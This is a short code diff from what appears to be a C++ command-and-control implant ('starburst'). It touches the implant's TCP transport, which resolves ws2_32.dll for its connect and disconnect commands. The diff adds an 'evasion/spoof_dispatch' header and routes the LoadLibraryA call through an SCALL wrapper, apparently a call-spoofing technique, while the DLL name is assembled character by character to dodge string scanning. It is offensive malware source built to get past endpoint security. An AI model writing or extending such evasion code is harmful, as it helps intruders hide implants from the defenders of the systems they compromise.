@@ -5,6 +5,7 @@
 #include <parser.h>
 #include <strings.h>
 #include <base64.h>
+#include <evasion/spoof_dispatch.h>
 
 #if defined( INCLUDE_CMD_CONNECT ) || defined( INCLUDE_CMD_DISCONNECT ) || defined( TCP_TRANSPORT )
 
@@ -20,7 +21,7 @@ auto declfn starburst::tcp_resolve_ws2(
     memory::zero( &state->ws, sizeof( TcpWsApis ) );
 
     char ws2_name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
-    state->h_ws2 = inst.kernel32.LoadLibraryA( ws2_name );
+    state->h_ws2 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, ws2_name );
     if ( !state->h_ws2 ) return false;
 
     state->ws.pWSAStartup = reinterpret_cast<tcp_fn_WSAStartup>(
